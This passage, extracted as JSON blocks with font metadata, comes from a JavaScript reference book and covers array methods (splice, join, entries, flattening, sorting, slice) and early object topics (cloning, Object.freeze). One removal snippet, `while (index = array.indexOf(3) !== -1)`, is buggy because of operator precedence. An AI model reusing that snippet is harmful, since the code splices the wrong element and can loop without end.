        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "To generalize the  reduce  version we'd have to pass in an  initial value  to cover the empty list case:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  myMax ( array )   {    return  array. reduce ( function ( maxSoFar ,  element )   {      return  Math. max ( maxSoFar ,  element );    },   - Infinity ); } myMax ([ 3 ,   5 ]);               // 5 myMax ([]);                   // -Infinity Math. max . apply ( null ,   []);    // -Infinity",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For the details on how to properly use  reduce  see Reducing values.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.21: Standard array initialization",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are many ways to create arrays. The most common are to use array literals, or the Array constructor:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 104",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ,   4 ]; var  arr2  =   new  Array ( 1 ,   2 ,   3 ,   4 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the Array constructor is used with no arguments, an empty array is created.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr3  =   new  Array ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "results in: [] Note that if it's used with exactly one argument and that argument is a  number , an array of that length with all undefined  values will be created instead:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr4  =   new  Array ( 4 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ undefined ,   undefined ,   undefined ,   undefined ]",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That does not apply if the single argument is non-numeric:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr5  =   new  Array ( \"foo\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"foo\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Similar to an array literal,  Array. of  can be used to create a new  Array  instance given a number of arguments:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Array. of ( 21 ,   \"Hello\" ,   \"World\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 21 ,   \"Hello\" ,   \"World\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In contrast to the Array constructor, creating an array with a single number such as  Array. of ( 23 )  will create a new array  [ 23 ] , rather than an Array with length 23. The other way to create and initialize an array would be  Array. from",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  newArray  =  Array. from ({  length :   5   },   ( _ ,  index )   =>  Math. pow ( index ,   4 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "will result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 0 ,   1 ,   16 ,   81 ,   256 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.22: Joining array elements in a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To join all of an array's elements into a string, you can use the  join  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ([ \"Hello\" ,   \" \" ,   \"world\" ] . join ( \"\" ));   // \"Hello world\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 105",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ([ 1 ,   800 ,   555 ,   1234 ] . join ( \"-\" ));   // \"1-800-555-1234\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As you can see in the second line, items that are not strings will be converted \ufb01rst.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.23: Removing/Adding elements using splice()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  splice () method can be used to remove elements from an array. In this example, we remove the \ufb01rst  3  from the array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  values  =   [ 1 ,   2 ,   3 ,   4 ,   5 ,   3 ]; var  i  =  values. indexOf ( 3 ); if   ( i  >=   0 )   {   values. splice ( i ,   1 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// [1, 2, 4, 5, 3]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  splice ()  method can also be used to add elements to an array. In this example, we will insert the numbers 6, 7, and 8 to the end of the array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  values  =   [ 1 ,   2 ,   4 ,   5 ,   3 ]; var  i  =  values. length   +   1 ; values. splice ( i ,   0 ,   6 ,   7 ,   8 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//[1, 2, 4, 5, 3, 6, 7, 8]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The \ufb01rst argument of the  splice ()  method is the index at which to remove/insert elements. The second argument is the number of elements to remove. The third argument and onwards are the values to insert into the array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.24: The entries() method",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  entries ()  method returns a new Array Iterator object that contains the key/value pairs for each index in the array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  letters  =   [ 'a' , 'b' , 'c' ]; for ( const [ index , element ]  of letters. entries ()){   console. log ( index , element ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "result",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "0   \"a\" 1   \"b\" 2   \"c\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note :  This method is not supported in Internet Explorer.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Portions of this content from  Array. prototype . entries  by  Mozilla Contributors  licensed under  CC-by-SA 2.5",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.25: Remove value from array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When you need to remove a speci\ufb01c value from an array, you can use the following one-liner to create a copy array without the given value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "array. filter ( function ( val )   {   return  val  !==  to_remove ;   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 106",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Or if you want to change the array itself without creating a copy (for example if you write a function that get an array as a function and manipulates it) you can use this snippet:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "while ( index  =  array. indexOf ( 3 )   !==   - 1 )   {  array. splice ( index ,   1 );   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And if you need to remove just the \ufb01rst value found, remove the while loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  index  =  array. indexOf ( to_remove ); if ( index  !==   - 1 )   {  array. splice ( index  ,   1 );   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.26: Flattening Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "2 Dimensional arrays",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In ES6, we can \ufb02atten the array by the spread operator  ... :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  flattenES6 ( arr )   {    return   [] . concat ( ... arr ); } var  arrL1  =   [ 1 ,   2 ,   [ 3 ,   4 ]]; console. log ( flattenES6 ( arrL1 ));   // [1, 2, 3, 4]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In ES5, we can achieve that by  .apply() :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  flatten ( arr )   {    return   [] . concat . apply ([],  arr ); } var  arrL1  =   [ 1 ,   2 ,   [ 3 ,   4 ]]; console. log ( flatten ( arrL1 ));   // [1, 2, 3, 4]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Higher Dimension Arrays",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Given a deeply nested array like so",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  deeplyNested  =   [ 4 ,[ 5 , 6 ,[ 7 , 8 ], 9 ]];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It can be \ufb02attened with this magic",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( String ( deeplyNested ) . split ( ',' ) . map ( Number ); # =>   [ 4 , 5 , 6 , 7 , 8 , 9 ] Or const  flatten  =  deeplyNested. toString () . split ( ',' ) . map ( Number ) console. log ( flatten ); # =>   [ 4 , 5 , 6 , 7 , 8 , 9 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Both of the above methods only work when the array is made up exclusively of numbers. A multi-dimensional array of objects cannot be \ufb02attened by this method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 107",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.27: Append / Prepend items to Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Unshift",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  . unshift  to add one or more items in the beginning of an array. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 3 ,   4 ,   5 ,   6 ]; array. unshift ( 1 ,   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "array results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ] Push",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Further  . push  is used to add items after the last currently existent item. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ]; array. push ( 4 ,   5 ,   6 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "array results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Both methods return the new array length.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.28: Object keys and values to array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  object  =   {     key1 :   10 ,     key2 :   3 ,     key3 :   40 ,     key4 :   20 };   var  array  =   []; for ( var  people  in  object )   {   array. push ([ people ,  object [ people ]]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now array is [",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   [ \"key1\" ,   10 ],    [ \"key2\" ,   3 ],    [ \"key3\" ,   40 ],    [ \"key4\" ,   20 ] ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 108",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.29: Logical connective of values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": ". some  and  . every  allow a logical connective of Array values. While  . some  combines the return values with  OR ,  . every  combines them with  AND . Examples for  . some",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ false ,   false ] . some ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ false ,   true ] . some ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ true ,   true ] . some ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And examples for  . every",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ false ,   false ] . every ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ false ,   true ] . every ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ true ,   true ] . every ( function ( value )   {    return  value ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Result: true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.30: Checking if an object is an Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Array. isArray ( obj )  returns  true  if the object is an  Array , otherwise  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Array. isArray ([])             // true Array. isArray ([ 1 ,   2 ,   3 ])      // true Array. isArray ({})             // false Array. isArray ( 1 )              // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In most cases you can  instanceof  to check if an object is an  Array .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[]   instanceof  Array ;   // true {}   instanceof  Array ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. isArray  has the an advantage over using a  instanceof  check in that it will still return  true  even if the prototype of the array has been changed and will return  false  if a non-arrays prototype was changed to the  Array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 109",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "prototype.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   []; Object. setPrototypeOf ( arr ,   null ); Array. isArray ( arr );     // true arr  instanceof  Array ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.31: Insert an item into an array at a speci\ufb01c index",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Simple item insertion can be done with  Array. prototype . splice  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "arr. splice ( index ,   0 ,  item );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More advanced variant with multiple arguments and chaining support:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "/* Syntax:    array.insert(index, value1, value2, ..., valueN) */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . insert   =   function ( index )   {    this . splice . apply ( this ,   [ index ,   0 ] . concat (     Array. prototype . slice . call ( arguments ,   1 )));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   this ; };",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ] . insert ( 2 ,   \"X\" ,   \"Y\" ,   \"Z\" ) . slice ( 1 ,   6 );    // [\"b\", \"X\", \"Y\", \"Z\", \"c\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And with array-type arguments merging and chaining support:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "/* Syntax:    array.insert(index, value1, value2, ..., valueN) */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . insert   =   function ( index )   {   index  =  Math. min ( index ,   this . length );   arguments. length   >   1      &&   this . splice . apply ( this ,   [ index ,   0 ] . concat ([] . pop . call ( arguments )))      &&   this . insert . apply ( this ,  arguments );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   this ; };",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ] . insert ( 2 ,   \"V\" ,   [ \"W\" ,   \"X\" ,   \"Y\" ],   \"Z\" ) . join ( \"-\" );    // \"a-b-V-W-X-Y-Z-c-d\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.32: Sorting multidimensional array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Given the following array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [    [ \"key1\" ,   10 ],    [ \"key2\" ,   3 ],    [ \"key3\" ,   40 ],    [ \"key4\" ,   20 ] ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can sort it sort it by number(second index)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "array. sort ( function ( a ,  b )   {    return  a [ 1 ]   -  b [ 1 ]; })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 110",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "array. sort (( a , b )   =>  a [ 1 ]   -  b [ 1 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will output [",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   [ \"key2\" ,   3 ],    [ \"key1\" ,   10 ],    [ \"key4\" ,   20 ],    [ \"key3\" ,   40 ] ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Be aware that the sort method operates on the array  in place . It changes the array. Most other array methods return a new array, leaving the original one intact. This is especially important to note if you use a functional programming style and expect functions to not have side-e\ufb00ects.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.33: Test all array items for equality",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  . every  method tests if all array elements pass a provided predicate test. To test all objects for equality, you can use the following code snippets.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   1 ] . every ( function ( item ,  i ,  list )   {   return  item  ===  list [ 0 ];   });   // false [ 1 ,   1 ,   1 ] . every ( function ( item ,  i ,  list )   {   return  item  ===  list [ 0 ];   });   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 1 ,   1 ,   1 ] . every (( item ,  i ,  list )   =>  item  ===  list [ 0 ]);   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The following code snippets test for property equality",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  data  =   [    {  name :   \"alice\" ,  id :   111   },    {  name :   \"alice\" ,  id :   222   } ]; data. every ( function ( item ,  i ,  list )   {   return  item  ===  list [ 0 ];   });   // false data. every ( function ( item ,  i ,  list )   {   return  item. name   ===  list [ 0 ] . name ;   });   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "data. every (( item ,  i ,  list )   =>  item. name   ===  list [ 0 ] . name );   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.34: Copy part of an Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The slice() method returns a copy of a portion of an array. It takes two parameters,  arr. slice ([ begin [,  end ]])  :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "begin",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Zero-based index which is the beginning of extraction. end Zero-based index which is the end of extraction, slicing up to this index but it's not included. If the end is a negative number, end  =  arr. length   +  end .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 1",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 111",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Let's say we have this Array of Alphabets",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  arr  =   [ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ... ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// I want an Array of the first two Alphabets",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  newArr  =  arr. slice ( 0 ,   2 );   // newArr === [\"a\", \"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example 2",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Let's say we have this Array of Numbers // and I don't know it's end",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  arr  =   [ 0 ,   1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ... ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// I want to slice this Array starting from // number 5 to its end var  newArr  =  arr. slice ( 4 );   // newArr === [5, 6, 7, 8, 9...]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 112",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 13: Objects",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Property Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The value to assign to the property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "writable",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Whether the value of the property can be changed or not.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "enumerable",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Whether the property will be enumerated in  for   in  loops or not. configurable  Whether it will be possible to rede\ufb01ne the property descriptor or not. get A function to be called that will return the value of the property. set A function to be called when the property is assigned a value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.1: Shallow cloning",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "ES6's  Object. assign ()  function can be used to copy all of the  enumerable  properties from an existing  Object instance to a new one.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  existing  =   {  a :   1 ,  b :   2 ,  c :   3   }; const  clone  =  Object. assign ({},  existing );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This includes  Symbol  properties in addition to  String  ones. Object rest/spread destructuring  which is currently a stage 3 proposal provides an even simpler way to create shallow clones of Object instances:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  existing  =   {  a :   1 ,  b :   2 ,  c :   3   }; const   {  ... clone   }   =  existing ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you need to support older versions of JavaScript, the most-compatible way to clone an Object is by manually iterating over its properties and \ufb01ltering out inherited ones using  . hasOwnProperty () .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  existing  =   {  a :   1 ,  b :   2 ,  c :   3   }; var  clone  =   {}; for   ( var  prop  in  existing )   {    if   ( existing. hasOwnProperty ( prop ))   {     clone [ prop ]   =  existing [ prop ];    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.2: Object.freeze",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Object. freeze  makes an object immutable by preventing the addition of new properties, the removal of existing properties, and the modi\ufb01cation of the enumerability, con\ufb01gurability, and writability of existing properties. It also prevents the value of existing properties from being changed. However, it does not work recursively which means that child objects are not automatically frozen and are subject to change. The operations following the freeze will fail silently unless the code is running in strict mode. If the code is in strict",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 113",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mode, a  TypeError  will be thrown.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   foo :   'foo' ,   bar :   [ 1 ,   2 ,   3 ],   baz :   {     foo :   'nested-foo'    } }; Object. freeze ( obj );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Cannot add new properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. newProperty   =   true ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Cannot modify existing values or their descriptors",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. foo   =   'not foo' ; Object. defineProperty ( obj ,   'foo' ,   {     writable :   true });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Cannot delete existing properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete  obj. foo ;",
